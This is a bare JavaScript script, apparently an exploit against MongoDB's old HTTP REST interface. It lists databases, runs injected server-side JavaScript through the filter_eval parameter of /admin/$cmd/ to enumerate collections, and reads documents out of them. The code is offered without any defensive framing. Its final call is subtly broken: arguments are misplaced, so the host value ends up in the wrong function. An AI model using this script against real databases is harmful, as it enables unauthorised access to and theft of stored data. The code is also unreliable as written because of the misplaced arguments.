function getXmlHttp(){
  var xmlhttp;
  try {
    xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
  } catch (e) {
    try {
      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    } catch (E) {
      xmlhttp = false;
    }
  }
  if (!xmlhttp && typeof XMLHttpRequest!='undefined') {
    xmlhttp = new XMLHttpRequest();
  }
  return xmlhttp;
}

function getDatabases(num) {
  var xmlhttp = getXmlHttp()
  xmlhttp.open('GET', '/listDatabases?text=1', false);
  xmlhttp.send(null);
  if(xmlhttp.status == 200) {
    a = JSON.parse(xmlhttp.responseText);
    return JSON.stringify(a.databases[num].name)
  }
}

function getCollectionFromDB(num, db, host) {
  var xmlhttp = getXmlHttp()
  xmlhttp.open('GET', '/admin/$cmd/?filter_eval=function() {conn = new Mongo("'+host+'"); db = conn.getDB('+ db +'); return db.getCollectionNames(); }&limit=1', false);
  xmlhttp.send(null);
  if(xmlhttp.status == 200) {
    a = JSON.parse(xmlhttp.responseText);
    return JSON.stringify(a.rows[0].retval[num])
  }
}

function getDocumentFromColl(num, coll, db) {
  var xmlhttp = getXmlHttp()
  xmlhttp.open('GET', '/'+db.replace("\"", "").replace("\"", "")+'/'+coll.replace("\"", "").replace("\"", "")+'/', false);
  xmlhttp.send(null);
  if(xmlhttp.status == 200) {
    a = JSON.parse(xmlhttp.responseText);
    return JSON.stringify(a.rows[num]).slice(43,-1).replace(",", " ");
  }
}

b = getDocumentFromColl(0, getCollectionFromDB(2, getDatabases(0)), getDatabases(0), "127.0.0.1" )
console.log(b);
